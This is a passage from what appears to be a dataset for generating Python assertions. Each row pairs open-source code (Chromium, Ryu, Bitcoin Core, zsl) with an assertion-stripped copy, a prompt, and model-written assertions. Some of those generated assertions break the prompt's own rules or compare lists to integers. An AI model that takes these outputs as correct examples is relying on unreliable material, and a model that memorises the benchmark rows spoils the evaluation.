128        if not kbp_queue.empty():
129            next_gen = kbp_queue.get()
130            if next_gen is None:
131                print(""Returned None."")
132                break
133            print(""Got the next generator."")
134        queueLock.release()
135        print(""consumer released the lock"")
136
137
138if __name__ == '__main__':
139    print(""starting now"")
140
141    BUF_SIZE = 2
142    kbp_queue = Queue.Queue(BUF_SIZE)
143    queueLock = threading.Lock()
144
145    thread.start_new_thread(KBP, (""/home/chwang/nana/mock"",))
146    # try:
147    #     threading.start_new_thread(KBP, (""/home/chwang/nana/EDL-DATA/KBP-EDL-2015/eng-train-parsed"",))
148
149    # except:
150    #     print(""Error: unable to start thread"")
151
152    consumer()
153
154    # generator = KBP(""/home/chwang/nana/EDL-DATA/KBP-EDL-2015/eng-train-parsed"")
155    # for item in generator:
156    #     print(item)
157",7908,"[[11, 'rspecifier', '!=', '', ""function LoadED requires a non-empty string as rspecifier parameter""],
[52, 'parts', '>=', 2, ""the split text must have at least 2 parts to continue processing""],
[56, 'parts', '==', 3, ""the split text must have exactly 3 parts to continue processing""],
[98, 'files', '!=', [], ""the file list should not be empty for the process to start""],
[101, 'files', '!=', [], ""the file list should not be empty for the process to continue""],
[126, 'kbp_queue', '!=', None, ""queue should be existent for the consumer to work""],
[129, 'next_gen', '!=', None, ""generator should not be None for the consumer to continue work""]]"
Nu3001/external_chromium_org,"# Copyright 2013 The Chromium Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.

import _winreg


def VerifyRegistryEntries(entries):
  """"""Verifies that the current registry matches the specified criteria.

  Args:
    entries: A dictionary whose keys are registry keys and values are
        expectation dictionaries.
  """"""
  for key, expectation in entries.iteritems():
    VerifyRegistryEntry(key, expectation)


def RootKeyConstant(key):
  """"""Converts a root registry key string into a _winreg.HKEY_* constant.""""""
  if key == 'HKEY_CLASSES_ROOT':
    return _winreg.HKEY_CLASSES_ROOT
  if key == 'HKEY_CURRENT_USER':
    return _winreg.HKEY_CURRENT_USER
  if key == 'HKEY_LOCAL_MACHINE':
    return _winreg.HKEY_LOCAL_MACHINE
  if key == 'HKEY_USERS':
    return _winreg.HKEY_USERS
  raise KeyError(""Unknown root registry key '%s'"" % key)


def VerifyRegistryEntry(key, expectation):
  """"""Verifies a registry key according to the |expectation|.

  The |expectation| specifies whether or not the registry key should exist
  (under 'exists') and optionally specifies an expected 'value' for the key.

  Args:
    key: Name of the registry key.
    expectation: A dictionary with the following keys and values:
        'exists' a boolean indicating whether the registry entry should exist.
        'value' (optional) a string representing the expected value for
            the key.
  """"""
  root_key, sub_key = key.split('\\', 1)
  try:
    # Query the Windows registry for the registry key. It will throw a
    # WindowsError if the key doesn't exist.
    _ = _winreg.OpenKey(RootKeyConstant(root_key), sub_key, 0, _winreg.KEY_READ)
  except WindowsError:
    # Key doesn't exist. See that it matches the expectation.
    assert not expectation['exists'], 'Registry entry %s is missing' % key
    return
  # The key exists, see that it matches the expectation.
  assert expectation['exists'], 'Registry entry %s exists' % key
  # TODO(sukolsak): Verify the expected value.
","
1# Copyright 2013 The Chromium Authors. All rights reserved.
2# Use of this source code is governed by a BSD-style license that can be
3# found in the LICENSE file.
4
5import _winreg
6
7
8def VerifyRegistryEntries(entries):
9  """"""Verifies that the current registry matches the specified criteria.
10
11  Args:
12    entries: A dictionary whose keys are registry keys and values are
13        expectation dictionaries.
14  """"""
15  for key, expectation in entries.iteritems():
16    VerifyRegistryEntry(key, expectation)
17
18
19def RootKeyConstant(key):
20  """"""Converts a root registry key string into a _winreg.HKEY_* constant.""""""
21  if key == 'HKEY_CLASSES_ROOT':
22    return _winreg.HKEY_CLASSES_ROOT
23  if key == 'HKEY_CURRENT_USER':
24    return _winreg.HKEY_CURRENT_USER
25  if key == 'HKEY_LOCAL_MACHINE':
26    return _winreg.HKEY_LOCAL_MACHINE
27  if key == 'HKEY_USERS':
28    return _winreg.HKEY_USERS
29  raise KeyError(""Unknown root registry key '%s'"" % key)
30
31
32def VerifyRegistryEntry(key, expectation):
33  """"""Verifies a registry key according to the |expectation|.
34
35  The |expectation| specifies whether or not the registry key should exist
36  (under 'exists') and optionally specifies an expected 'value' for the key.
37
38  Args:
39    key: Name of the registry key.
40    expectation: A dictionary with the following keys and values:
41        'exists' a boolean indicating whether the registry entry should exist.
42        'value' (optional) a string representing the expected value for
43            the key.
44  """"""
45  root_key, sub_key = key.split('\\', 1)
46  try:
47    # Query the Windows registry for the registry key. It will throw a
48    # WindowsError if the key doesn't exist.
49    _ = _winreg.OpenKey(RootKeyConstant(root_key), sub_key, 0, _winreg.KEY_READ)
50  except WindowsError:
51    # Key doesn't exist. See that it matches the expectation.
52    return
53  # The key exists, see that it matches the expectation.
54  # TODO(sukolsak): Verify the expected value.
55","[[""expectation['exists']"", '==', 'False'], [""expectation['exists']"", '==', 'True']]",2,2,1.0,0.0009722897423432,"['entries', 'key', 'expectation', 'root_key', 'sub_key', '_']",6,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['entries', 'key', 'expectation', 'root_key', 'sub_key', '_']
*Code:

1# Copyright 2013 The Chromium Authors. All rights reserved.
2# Use of this source code is governed by a BSD-style license that can be
3# found in the LICENSE file.
4
5import _winreg
6
7
8def VerifyRegistryEntries(entries):
9  """"""Verifies that the current registry matches the specified criteria.
10
11  Args:
12    entries: A dictionary whose keys are registry keys and values are
13        expectation dictionaries.
14  """"""
15  for key, expectation in entries.iteritems():
16    VerifyRegistryEntry(key, expectation)
17
18
19def RootKeyConstant(key):
20  """"""Converts a root registry key string into a _winreg.HKEY_* constant.""""""
21  if key == 'HKEY_CLASSES_ROOT':
22    return _winreg.HKEY_CLASSES_ROOT
23  if key == 'HKEY_CURRENT_USER':
24    return _winreg.HKEY_CURRENT_USER
25  if key == 'HKEY_LOCAL_MACHINE':
26    return _winreg.HKEY_LOCAL_MACHINE
27  if key == 'HKEY_USERS':
28    return _winreg.HKEY_USERS
29  raise KeyError(""Unknown root registry key '%s'"" % key)
30
31
32def VerifyRegistryEntry(key, expectation):
33  """"""Verifies a registry key according to the |expectation|.
34
35  The |expectation| specifies whether or not the registry key should exist
36  (under 'exists') and optionally specifies an expected 'value' for the key.
37
38  Args:
39    key: Name of the registry key.
40    expectation: A dictionary with the following keys and values:
41        'exists' a boolean indicating whether the registry entry should exist.
42        'value' (optional) a string representing the expected value for
43            the key.
44  """"""
45  root_key, sub_key = key.split('\\', 1)
46  try:
47    # Query the Windows registry for the registry key. It will throw a
48    # WindowsError if the key doesn't exist.
49    _ = _winreg.OpenKey(RootKeyConstant(root_key), sub_key, 0, _winreg.KEY_READ)
50  except WindowsError:
51    # Key doesn't exist. See that it matches the expectation.
52    return
53  # The key exists, see that it matches the expectation.
54  # TODO(sukolsak): Verify the expected value.
55",3460,"[[8, 'entries', '!=', None, ""the function VerifyRegistryEntries requires a non-null input""],
[19, 'key', '!=', None, ""the function RootKeyConstant requires a non-null input""],
[32, 'key', '!=', None, ""the function VerifyRegistryEntry requires a non-null input for key""],
[32, 'expectation', '!=', None, ""the function VerifyRegistryEntry requires a non-null input for expectation""]]"
StephenKing/ryu,"# Copyright (C) 2015 Nippon Telegraph and Telephone Corporation.
# Copyright (C) 2015 YAMAMOTO Takashi <yamamoto at valinux co jp>
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
# implied.
# See the License for the specific language governing permissions and
# limitations under the License.


import six

from ryu.lib import addrconv


class TypeDescr(object):
    pass


class IntDescr(TypeDescr):
    def __init__(self, size):
        self.size = size

    def to_user(self, bin):
        i = 0
        for x in range(self.size):
            c = bin[:1]
            i = i * 256 + ord(c)
            bin = bin[1:]
        return i

    def from_user(self, i):
        bin = b''
        for x in range(self.size):
            bin = six.int2byte(i & 255) + bin
            i //= 256
        return bin

Int1 = IntDescr(1)
Int2 = IntDescr(2)
Int3 = IntDescr(3)
Int4 = IntDescr(4)
Int8 = IntDescr(8)


def _split_str(s, n):
    """"""
    split string into list of strings by specified number.
    """"""
    length = len(s)
    return [s[i:i + n] for i in range(0, length, n)]


class IntDescrMlt(TypeDescr):
    def __init__(self, length, num):
        self.length = length
        self.num = num
        self.size = length * num

    def to_user(self, bin):
        assert len(bin) == self.size
        lb = _split_str(bin, self.length)
        li = []
        for b in lb:
            i = 0
            for x in range(self.length):
                c = b[:1]
                i = i * 256 + ord(c)
                b = b[1:]
            li.append(i)
        return tuple(li)

    def from_user(self, li):
        assert len(li) == self.num
        bin = b''
        for i in li:
            b = b''
            for x in range(self.length):
                b = six.int2byte(i & 255) + b
                i //= 256
            bin += b
        return bin

Int4Double = IntDescrMlt(4, 2)


class MacAddr(TypeDescr):
    size = 6
    to_user = addrconv.mac.bin_to_text
    from_user = addrconv.mac.text_to_bin


class IPv4Addr(TypeDescr):
    size = 4
    to_user = addrconv.ipv4.bin_to_text
    from_user = addrconv.ipv4.text_to_bin


class IPv6Addr(TypeDescr):
    size = 16
    to_user = addrconv.ipv6.bin_to_text
    from_user = addrconv.ipv6.text_to_bin


class UnknownType(TypeDescr):
    import base64

    b64encode = base64.b64encode
    if six.PY3:
        @classmethod
        def to_user(cls, data):
            return cls.b64encode(data).decode('ascii')
    else:
        to_user = staticmethod(base64.b64encode)
    from_user = staticmethod(base64.b64decode)
","
1# Copyright (C) 2015 Nippon Telegraph and Telephone Corporation.
2# Copyright (C) 2015 YAMAMOTO Takashi <yamamoto at valinux co jp>
3#
4# Licensed under the Apache License, Version 2.0 (the ""License"");
5# you may not use this file except in compliance with the License.
6# You may obtain a copy of the License at
7#
8#    http://www.apache.org/licenses/LICENSE-2.0
9#
10# Unless required by applicable law or agreed to in writing, software
11# distributed under the License is distributed on an ""AS IS"" BASIS,
12# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
13# implied.
14# See the License for the specific language governing permissions and
15# limitations under the License.
16
17
18import six
19
20from ryu.lib import addrconv
21
22
23class TypeDescr(object):
24    pass
25
26
27class IntDescr(TypeDescr):
28    def __init__(self, size):
29        self.size = size
30
31    def to_user(self, bin):
32        i = 0
33        for x in range(self.size):
34            c = bin[:1]
35            i = i * 256 + ord(c)
36            bin = bin[1:]
37        return i
38
39    def from_user(self, i):
40        bin = b''
41        for x in range(self.size):
42            bin = six.int2byte(i & 255) + bin
43            i //= 256
44        return bin
45
46Int1 = IntDescr(1)
47Int2 = IntDescr(2)
48Int3 = IntDescr(3)
49Int4 = IntDescr(4)
50Int8 = IntDescr(8)
51
52
53def _split_str(s, n):
54    """"""
55    split string into list of strings by specified number.
56    """"""
57    length = len(s)
58    return [s[i:i + n] for i in range(0, length, n)]
59
60
61class IntDescrMlt(TypeDescr):
62    def __init__(self, length, num):
63        self.length = length
64        self.num = num
65        self.size = length * num
66
67    def to_user(self, bin):
68        lb = _split_str(bin, self.length)
69        li = []
70        for b in lb:
71            i = 0
72            for x in range(self.length):
73                c = b[:1]
74                i = i * 256 + ord(c)
75                b = b[1:]
76            li.append(i)
77        return tuple(li)
78
79    def from_user(self, li):
80        bin = b''
81        for i in li:
82            b = b''
83            for x in range(self.length):
84                b = six.int2byte(i & 255) + b
85                i //= 256
86            bin += b
87        return bin
88
89Int4Double = IntDescrMlt(4, 2)
90
91
92class MacAddr(TypeDescr):
93    size = 6
94    to_user = addrconv.mac.bin_to_text
95    from_user = addrconv.mac.text_to_bin
96
97
98class IPv4Addr(TypeDescr):
99    size = 4
100    to_user = addrconv.ipv4.bin_to_text
101    from_user = addrconv.ipv4.text_to_bin
102
103
104class IPv6Addr(TypeDescr):
105    size = 16
106    to_user = addrconv.ipv6.bin_to_text
107    from_user = addrconv.ipv6.text_to_bin
108
109
110class UnknownType(TypeDescr):
111    import base64
112
113    b64encode = base64.b64encode
114    if six.PY3:
115        @classmethod
116        def to_user(cls, data):
117            return cls.b64encode(data).decode('ascii')
118    else:
119        to_user = staticmethod(base64.b64encode)
120    from_user = staticmethod(base64.b64decode)
121","[['len(bin)', '==', 'self.size'], ['len(li)', '==', 'self.num']]",2,2,1.0,0.0006788866259334,"['size', 'self.size', 'bin', 'i', 'c', 'Int1', 'Int2', 'Int3', 'Int4', 'Int8', 's', 'n', 'length', 'num', 'self.length', 'self.num', 'lb', 'li', 'b', 'Int4Double', 'to_user', 'from_user', 'b64encode', 'cls', 'data']",25,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['size', 'self.size', 'bin', 'i', 'c', 'Int1', 'Int2', 'Int3', 'Int4', 'Int8', 's', 'n', 'length', 'num', 'self.length', 'self.num', 'lb', 'li', 'b', 'Int4Double', 'to_user', 'from_user', 'b64encode', 'cls', 'data']
*Code:

1# Copyright (C) 2015 Nippon Telegraph and Telephone Corporation.
2# Copyright (C) 2015 YAMAMOTO Takashi <yamamoto at valinux co jp>
3#
4# Licensed under the Apache License, Version 2.0 (the ""License"");
5# you may not use this file except in compliance with the License.
6# You may obtain a copy of the License at
7#
8#    http://www.apache.org/licenses/LICENSE-2.0
9#
10# Unless required by applicable law or agreed to in writing, software
11# distributed under the License is distributed on an ""AS IS"" BASIS,
12# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
13# implied.
14# See the License for the specific language governing permissions and
15# limitations under the License.
16
17
18import six
19
20from ryu.lib import addrconv
21
22
23class TypeDescr(object):
24    pass
25
26
27class IntDescr(TypeDescr):
28    def __init__(self, size):
29        self.size = size
30
31    def to_user(self, bin):
32        i = 0
33        for x in range(self.size):
34            c = bin[:1]
35            i = i * 256 + ord(c)
36            bin = bin[1:]
37        return i
38
39    def from_user(self, i):
40        bin = b''
41        for x in range(self.size):
42            bin = six.int2byte(i & 255) + bin
43            i //= 256
44        return bin
45
46Int1 = IntDescr(1)
47Int2 = IntDescr(2)
48Int3 = IntDescr(3)
49Int4 = IntDescr(4)
50Int8 = IntDescr(8)
51
52
53def _split_str(s, n):
54    """"""
55    split string into list of strings by specified number.
56    """"""
57    length = len(s)
58    return [s[i:i + n] for i in range(0, length, n)]
59
60
61class IntDescrMlt(TypeDescr):
62    def __init__(self, length, num):
63        self.length = length
64        self.num = num
65        self.size = length * num
66
67    def to_user(self, bin):
68        lb = _split_str(bin, self.length)
69        li = []
70        for b in lb:
71            i = 0
72            for x in range(self.length):
73                c = b[:1]
74                i = i * 256 + ord(c)
75                b = b[1:]
76            li.append(i)
77        return tuple(li)
78
79    def from_user(self, li):
80        bin = b''
81        for i in li:
82            b = b''
83            for x in range(self.length):
84                b = six.int2byte(i & 255) + b
85                i //= 256
86            bin += b
87        return bin
88
89Int4Double = IntDescrMlt(4, 2)
90
91
92class MacAddr(TypeDescr):
93    size = 6
94    to_user = addrconv.mac.bin_to_text
95    from_user = addrconv.mac.text_to_bin
96
97
98class IPv4Addr(TypeDescr):
99    size = 4
100    to_user = addrconv.ipv4.bin_to_text
101    from_user = addrconv.ipv4.text_to_bin
102
103
104class IPv6Addr(TypeDescr):
105    size = 16
106    to_user = addrconv.ipv6.bin_to_text
107    from_user = addrconv.ipv6.text_to_bin
108
109
110class UnknownType(TypeDescr):
111    import base64
112
113    b64encode = base64.b64encode
114    if six.PY3:
115        @classmethod
116        def to_user(cls, data):
117            return cls.b64encode(data).decode('ascii')
118    else:
119        to_user = staticmethod(base64.b64encode)
120    from_user = staticmethod(base64.b64decode)
121",4725,"[[28, 'size', '>=', 1, ""size initializes IntDescr objects and should be positive""], 
[39, 'i', '>=', 0, ""normalize all IntDescr conversions for positive integers""],
[61, 'length', '>', 0, ""length initializes IntDescrMlt objects and should be positive""],
[61, 'num', '>', 0, ""num initializes IntDescrMlt objects, this value should be greater than zero""],
[79, 'li', '!=', None, ""li should not be none to process conversion in the IntDescrMlt class""],
[112, 'b64encode', '!=', None, ""b64encode should not be none to encode data in the UnknownType class""],
[116, 'data', '!=', None, ""data should not be none to encode in the UnknownType class""]]"
jamesob/bitcoin,"#!/usr/bin/env python3
# Copyright (c) 2014-2021 The Bitcoin Core developers
# Distributed under the MIT software license, see the accompanying
# file COPYING or http://www.opensource.org/licenses/mit-license.php.
""""""Test resurrection of mined transactions when the blockchain is re-organized.""""""

from test_framework.blocktools import COINBASE_MATURITY
from test_framework.test_framework import BitcoinTestFramework
from test_framework.util import assert_equal
from test_framework.wallet import MiniWallet


class MempoolCoinbaseTest(BitcoinTestFramework):
    def set_test_params(self):
        self.num_nodes = 1
        self.setup_clean_chain = True

    def run_test(self):
        node = self.nodes[0]
        wallet = MiniWallet(node)

        # Add enough mature utxos to the wallet so that all txs spend confirmed coins
        self.generate(wallet, 3)
        self.generate(node, COINBASE_MATURITY)

        # Spend block 1/2/3's coinbase transactions
        # Mine a block
        # Create three more transactions, spending the spends
        # Mine another block
        # ... make sure all the transactions are confirmed
        # Invalidate both blocks
        # ... make sure all the transactions are put back in the mempool
        # Mine a new block
        # ... make sure all the transactions are confirmed again
        blocks = []
        spends1_ids = [wallet.send_self_transfer(from_node=node)['txid'] for _ in range(3)]
        blocks.extend(self.generate(node, 1))
        spends2_ids = [wallet.send_self_transfer(from_node=node)['txid'] for _ in range(3)]
        blocks.extend(self.generate(node, 1))

        spends_ids = set(spends1_ids + spends2_ids)

        # mempool should be empty, all txns confirmed
        assert_equal(set(node.getrawmempool()), set())
        confirmed_txns = set(node.getblock(blocks[0])['tx'] + node.getblock(blocks[1])['tx'])
        # Checks that all spend txns are contained in the mined blocks
        assert spends_ids < confirmed_txns

        # Use invalidateblock to re-org back
        node.invalidateblock(blocks[0])

        # All txns should be back in mempool with 0 confirmations
        assert_equal(set(node.getrawmempool()), spends_ids)

        # Generate another block, they should all get mined
        blocks = self.generate(node, 1)
        # mempool should be empty, all txns confirmed
        assert_equal(set(node.getrawmempool()), set())
        confirmed_txns = set(node.getblock(blocks[0])['tx'])
        assert spends_ids < confirmed_txns


if __name__ == '__main__':
    MempoolCoinbaseTest().main()
","
1#!/usr/bin/env python3
2# Copyright (c) 2014-2021 The Bitcoin Core developers
3# Distributed under the MIT software license, see the accompanying
4# file COPYING or http://www.opensource.org/licenses/mit-license.php.
5""""""Test resurrection of mined transactions when the blockchain is re-organized.""""""
6
7from test_framework.blocktools import COINBASE_MATURITY
8from test_framework.test_framework import BitcoinTestFramework
9from test_framework.wallet import MiniWallet
10
11
12class MempoolCoinbaseTest(BitcoinTestFramework):
13    def set_test_params(self):
14        self.num_nodes = 1
15        self.setup_clean_chain = True
16
17    def run_test(self):
18        node = self.nodes[0]
19        wallet = MiniWallet(node)
20
21        # Add enough mature utxos to the wallet so that all txs spend confirmed coins
22        self.generate(wallet, 3)
23        self.generate(node, COINBASE_MATURITY)
24
25        # Spend block 1/2/3's coinbase transactions
26        # Mine a block
27        # Create three more transactions, spending the spends
28        # Mine another block
29        # ... make sure all the transactions are confirmed
30        # Invalidate both blocks
31        # ... make sure all the transactions are put back in the mempool
32        # Mine a new block
33        # ... make sure all the transactions are confirmed again
34        blocks = []
35        spends1_ids = [wallet.send_self_transfer(from_node=node)['txid'] for _ in range(3)]
36        blocks.extend(self.generate(node, 1))
37        spends2_ids = [wallet.send_self_transfer(from_node=node)['txid'] for _ in range(3)]
38        blocks.extend(self.generate(node, 1))
39
40        spends_ids = set(spends1_ids + spends2_ids)
41
42        # mempool should be empty, all txns confirmed
43        confirmed_txns = set(node.getblock(blocks[0])['tx'] + node.getblock(blocks[1])['tx'])
44        # Checks that all spend txns are contained in the mined blocks
45
46        # Use invalidateblock to re-org back
47        node.invalidateblock(blocks[0])
48
49        # All txns should be back in mempool with 0 confirmations
50
51        # Generate another block, they should all get mined
52        blocks = self.generate(node, 1)
53        # mempool should be empty, all txns confirmed
54        confirmed_txns = set(node.getblock(blocks[0])['tx'])
55
56
57if __name__ == '__main__':
58    MempoolCoinbaseTest().main()
59","[['spends_ids', '<', 'confirmed_txns'], ['spends_ids', '<', 'confirmed_txns']]",6,2,0.3333333333333333,0.0007724990343762,"['self.num_nodes', 'self.setup_clean_chain', 'node', 'wallet', 'blocks', 'spends1_ids', 'spends2_ids', 'spends_ids', 'confirmed_txns']",9,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['self.num_nodes', 'self.setup_clean_chain', 'node', 'wallet', 'blocks', 'spends1_ids', 'spends2_ids', 'spends_ids', 'confirmed_txns']
*Code:

1#!/usr/bin/env python3
2# Copyright (c) 2014-2021 The Bitcoin Core developers
3# Distributed under the MIT software license, see the accompanying
4# file COPYING or http://www.opensource.org/licenses/mit-license.php.
5""""""Test resurrection of mined transactions when the blockchain is re-organized.""""""
6
7from test_framework.blocktools import COINBASE_MATURITY
8from test_framework.test_framework import BitcoinTestFramework
9from test_framework.wallet import MiniWallet
10
11
12class MempoolCoinbaseTest(BitcoinTestFramework):
13    def set_test_params(self):
14        self.num_nodes = 1
15        self.setup_clean_chain = True
16
17    def run_test(self):
18        node = self.nodes[0]
19        wallet = MiniWallet(node)
20
21        # Add enough mature utxos to the wallet so that all txs spend confirmed coins
22        self.generate(wallet, 3)
23        self.generate(node, COINBASE_MATURITY)
24
25        # Spend block 1/2/3's coinbase transactions
26        # Mine a block
27        # Create three more transactions, spending the spends
28        # Mine another block
29        # ... make sure all the transactions are confirmed
30        # Invalidate both blocks
31        # ... make sure all the transactions are put back in the mempool
32        # Mine a new block
33        # ... make sure all the transactions are confirmed again
34        blocks = []
35        spends1_ids = [wallet.send_self_transfer(from_node=node)['txid'] for _ in range(3)]
36        blocks.extend(self.generate(node, 1))
37        spends2_ids = [wallet.send_self_transfer(from_node=node)['txid'] for _ in range(3)]
38        blocks.extend(self.generate(node, 1))
39
40        spends_ids = set(spends1_ids + spends2_ids)
41
42        # mempool should be empty, all txns confirmed
43        confirmed_txns = set(node.getblock(blocks[0])['tx'] + node.getblock(blocks[1])['tx'])
44        # Checks that all spend txns are contained in the mined blocks
45
46        # Use invalidateblock to re-org back
47        node.invalidateblock(blocks[0])
48
49        # All txns should be back in mempool with 0 confirmations
50
51        # Generate another block, they should all get mined
52        blocks = self.generate(node, 1)
53        # mempool should be empty, all txns confirmed
54        confirmed_txns = set(node.getblock(blocks[0])['tx'])
55
56
57if __name__ == '__main__':
58    MempoolCoinbaseTest().main()
59",3912,"Based on the provided code and variables, here are some assertions you could insert:

[14, 'self.num_nodes', '==', 1, ""there should only be one node in the test""],
[35, 'spends1_ids', '==', 3, ""three transactions should be initiated for spends1_ids""],
[37, 'spends2_ids', '==', 3, ""three transactions should be initiated for spends2_ids""],
[40, 'spends_ids', '==', 6, ""six transactions should be present in total in spends_ids""],
[53, 'blocks', '==', 1, ""only one block should be generated and exist""],
[54, 'confirmed_txns', '==', 3, ""all three transactions should be confirmed again""]"
AtteqCom/zsl,"""""""
:mod:`zsl.db.helpers.pagination`
--------------------------------
""""""
from __future__ import unicode_literals

from builtins import object
from typing import Dict, Union

from sqlalchemy.orm.query import Query

from zsl.db.model.app_model import AppModel

FIRST_PAGE = 1
DEFAULT_PAGE_SIZE = 25


class Pagination(object):
    """"""
    Pagination support. Allows to paginate a query. There are two choices.
      #. :meth:`.paginate` - paginates a query and obtains the count
         automatically.
      #. :meth:`.apply_pagination` - paginates a query and assumes that
         record count is set in advance.
    """"""

    def __init__(self, pagination=None):
        # type: (Union[PaginationRequest, Dict[str, Union[str, int]], None])->None
        pagination = self._create_pagination_request(pagination)
        assert isinstance(pagination, PaginationRequest)
        self._offset = (pagination.page_no - FIRST_PAGE) * pagination.page_size
        self._page_size = pagination.page_size
        self._record_count = -1

    def _create_pagination_request(self, pagination):
        # type: (Union[PaginationRequest, Dict[str, Union[str, int]], None])->PaginationRequest
        if pagination is None:
            pagination = PaginationRequest()
        elif isinstance(pagination, dict):
            page_size = int(pagination.get('page_size', DEFAULT_PAGE_SIZE))
            pagination = PaginationRequest.create(
                FIRST_PAGE + int(pagination.get('offset', 0)) // page_size,
                page_size)
        return pagination

    @property
    def record_count(self):
        return self._record_count

    @record_count.setter
    def record_count(self, record_count):
        self._record_count = record_count

    @property
    def page_size(self):
        return self._page_size

    @page_size.setter
    def page_size(self, page_size):
        # type: (int)->None
        self._page_size = page_size

    @property
    def offset(self):
        count = self._record_count
        per_page = self.page_size
        if self._offset >= count:
            last_page_size = count % per_page
            if last_page_size == 0:
                last_page_size = per_page
            self._offset = count - last_page_size
        if self._offset < 0:
            self._offset = 0

        return self._offset

    @offset.setter
    def offset(self, offset):
        # type:(int)->None
        self._offset = offset

    def apply_pagination(self, q):
        # type: (Query)->Query
        """"""
        Filters the query so that a given page is returned. The record count
        must be set in advance.
        :param q: Query to be paged.
        :return: Paged query.
        """"""
        assert self.record_count >= 0, ""Record count must be set.""
        return q.limit(self.page_size).offset(self.offset)

    def paginate(self, q):
        # type: (Query)->Query
        """"""
        Filters the query so that a given page is returned. The record count
        is computed automatically from query.
        :param q: Query to be paged.
        :return: Paged query.
        """"""
        self.record_count = q.count()
        return self.apply_pagination(q).all()


class PaginationRequest(AppModel):
    def __init__(self, raw=None, id_name='id', hints=None):
        if raw is None:
            raw = {'page_no': FIRST_PAGE, 'page_size': DEFAULT_PAGE_SIZE}

        super(PaginationRequest, self).__init__(raw, id_name, hints)
        self.page_no = int(self.page_no) if self.page_no else FIRST_PAGE
        self.page_size = int(self.page_size) if self.page_size else DEFAULT_PAGE_SIZE

    @staticmethod
    def create(page_no: int = FIRST_PAGE, page_size: int = DEFAULT_PAGE_SIZE) -> 'PaginationRequest':
        return PaginationRequest({'page_no': page_no, 'page_size': page_size})


class PaginationResponse(AppModel):
    def __init__(self, record_count, page_size, pagination):
        # type: (int, int, PaginationRequest)->None
        super(PaginationResponse, self).__init__({})
        self.record_count = record_count
        max_page_size = pagination.page_size
        self.page_count = (record_count + max_page_size - 1) // max_page_size
        self.page_size = page_size
        self.max_page_size = max_page_size
        self.page_no = pagination.page_no
","
1""""""
2:mod:`zsl.db.helpers.pagination`
3--------------------------------
4""""""
5from __future__ import unicode_literals
6
7from builtins import object
8from typing import Dict, Union
9
10from sqlalchemy.orm.query import Query
11
12from zsl.db.model.app_model import AppModel
13
14FIRST_PAGE = 1
15DEFAULT_PAGE_SIZE = 25
16
17
18class Pagination(object):
19    """"""
20    Pagination support. Allows to paginate a query. There are two choices.
21      #. :meth:`.paginate` - paginates a query and obtains the count
22         automatically.
23      #. :meth:`.apply_pagination` - paginates a query and assumes that
24         record count is set in advance.
25    """"""
26
27    def __init__(self, pagination=None):
28        # type: (Union[PaginationRequest, Dict[str, Union[str, int]], None])->None
29        pagination = self._create_pagination_request(pagination)
30        self._offset = (pagination.page_no - FIRST_PAGE) * pagination.page_size
31        self._page_size = pagination.page_size
32        self._record_count = -1
33
34    def _create_pagination_request(self, pagination):
35        # type: (Union[PaginationRequest, Dict[str, Union[str, int]], None])->PaginationRequest
36        if pagination is None:
